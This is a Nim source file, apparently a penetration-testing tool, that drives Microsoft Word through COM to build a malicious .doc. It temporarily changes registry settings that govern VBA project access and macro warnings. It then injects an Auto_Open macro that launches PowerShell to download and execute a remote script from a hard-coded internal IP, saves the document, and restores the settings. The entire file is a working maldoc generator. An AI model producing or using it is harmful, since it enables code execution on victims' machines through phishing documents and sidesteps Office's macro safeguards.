import winim/com
import strformat
import os

let wordfilename =  paramStr(1)
comScript:
  var objMsWord = CreateObject("Word.Application")
  var WshShell = CreateObject("WScript.Shell")
  var Application_Version = objMsWord.Version
  

  var strVBOMRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Word\Security\AccessVBOM"
  var strVBAWarnRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Word\Security\VBAWarnings"
  WshShell.RegWrite(strVBOMRegPath, 1, "REG_DWORD")
  WshShell.RegWrite(strVBAWarnRegPath, 1, "REG_DWORD")

  objMsWord.visible = true
  objMsWord.displayalerts = false

  #var objWordDoc = objMsWord.documents.Add()
  #var fn = r"D:\Dev369\NimForPentest\test.doc"
  #var objWordDoc = objMsWord.documents.Open(fn,ConfirmConversions:=FALSE,ReadOnly:=1,AddToRecentFiles:=0,PasswordDocument:="",PasswordTemplate:=0,Revert:=0,WritePasswordDocument:="",WritePasswordTemplate:="",Format:=0,Encoding:=20127,Visible:=0,OpenAndRepair:=0,DocumentDirection:=0,NoEncodingDialog:=0,XMLTransform:=0)
  var objWordDoc = objMsWord.documents.Add()
  objWordDoc.Activate()
  var wordVBmodule = objWordDoc.VBProject.VBComponents.Add(1)
  var strMacroRevShell = """Sub Auto_Open()
Call Shell("cmd.exe /c powershell.exe IEX(IWR -uri 'http://192.168.1.75:443/getit.txt')", 0)
End Sub"""
  wordVBmodule.CodeModule.AddFromString(strMacroRevShell)
   
  echo wordfilename
  #objWordDoc.SaveAs(wordfilename,0)
  objWordDoc.SaveAs(wordfilename,FileFormat:=0,Password:="",WritePassword:="",ReadOnlyRecommended:=FALSE,AddToRecentFiles:=0,EmbedTrueTypeFonts:=0,SaveNativePictureFormat:=0,SaveFormsData:=0,SaveAsAOCELetter:=0,Encoding:=20127,InsertLineBreaks:=0,AllowSubstitutions:=TRUE,LineEnding:=0,AddBiDiMarks:=0)
 #objWordDoc.SaveAs(wordfilename,FileFormat:=0,LockComments:=0,Password:="",AddToRecentFiles:=0,WritePassword:="",ReadOnlyRecommended:=0,EmbedTrueTypeFonts:=0,SaveNativePictureFormat:=0,SaveFormsData:=0,SaveAsAOCELetter:=0,Encoding:=0,InsertLineBreaks:=0,AllowSubstitutions:=0,LineEnding:=0,AddBiDiMarks:=0)
  WshShell.RegWrite(strVBOMRegPath, 0, "REG_DWORD")
  WshShell.RegWrite(strVBAWarnRegPath, 0, "REG_DWORD")
  objWordDoc.Close(false)
  #COM_FullRelease() # make sure word.exe will end it self